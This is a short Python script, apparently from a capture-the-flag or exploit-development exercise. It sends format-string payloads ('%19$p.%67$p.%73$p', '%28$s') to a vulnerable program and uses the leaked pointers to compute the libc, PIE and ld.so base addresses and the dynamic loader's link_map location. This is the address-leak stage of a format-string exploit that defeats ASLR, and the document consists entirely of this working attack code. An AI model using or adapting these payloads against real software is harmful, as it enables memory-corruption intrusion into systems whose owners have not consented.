import re
from rprobe import run
# f1: leak libc ret(-0x29ca8), AT_PHDR(PIE+0x40), AT_BASE(ld.so base)
# f2: leak bytes at _rtld_global (= _ns_loaded ptr) and at ldso+0x375f0
for rep in range(3):
    try:
        lk,out=run('1', r'%19$p.%67$p.%73$p', r'%28$s')
        m=re.search(r'0x([0-9a-f]+)\.0x([0-9a-f]+)\.0x([0-9a-f]+)',out)
        libc=int(m.group(1),16)-0x29ca8; pie=int(m.group(2),16)-0x40; ldso=int(m.group(3),16)
        rest=out[out.index(m.group(0))+len(m.group(0)):]
        raw=rest[:-1].encode('latin1')  # drop trailing 'B' of printf(buf2)
        nsm=0
        for i,b in enumerate(raw): nsm |= b<<(8*i)
        print('libc=%#x pie=%#x ldso=%#x | ns_loaded=%#x -> linkmap-ldso=%+#x  (low16=%#x, ldso low16=%#x)'%(
            libc,pie,ldso,nsm,nsm-ldso,nsm&0xffff,ldso&0xffff))
    except Exception as e: print('ERR',e)
